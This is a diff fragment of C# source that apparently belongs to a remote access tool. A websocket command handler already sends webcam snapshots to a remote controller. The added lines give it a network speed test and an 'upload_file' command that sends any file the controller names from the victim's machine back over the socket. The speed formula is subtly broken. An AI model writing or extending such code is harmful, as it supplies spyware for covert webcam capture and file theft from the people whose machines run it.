@@ -47,6 +47,32 @@ namespace A3
                         var SigBase64 = Convert.ToBase64String(byteImage);
                         ws.Send("##WEBCAM_SNAP##"+SigBase64);
                         ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                    }else if(message == "speedtest")
+                    {
+                        const string tempfile = "tempfile.tmp";
+                        System.Net.WebClient webClient = new System.Net.WebClient();
+                        Stopwatch sww = Stopwatch.StartNew();
+                        webClient.DownloadFile("http://www.ovh.net/files/100Mio.dat", tempfile);
+                        sww.Stop();
+
+                        FileInfo fileInfo = new FileInfo(tempfile);
+                        long speed = fileInfo.Length / sww.Elapsed.Milliseconds / 1000;
+                        string jj = "{\"duration\":\""+ sww.Elapsed.Milliseconds+"\",\"file_size\":\""+ fileInfo.Length.ToString("N0")+"\",\"speed\":\""+ speed.ToString("N0")+"\"}";
+                        ws.Send("##SPEEDTEST##" + jj);
+                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                    }
+                    else if(message.StartsWith("upload_file"))
+                    {   
+                        string filepath = message.Replace("upload_file ","");
+                        if (System.IO.File.Exists(filepath)){
+                            FileInfo info = new FileInfo(filepath);
+                            ws.Send("##FILENAME##" + filepath);
+                            ws.Send(info);
+                            ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                        }else{
+                            ws.Send("##MESSAGE##{\"type\":\"error\", \"message\":\"Error, file does not exists !\"}");
+                            ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                        }
                     }
                     else
                     {
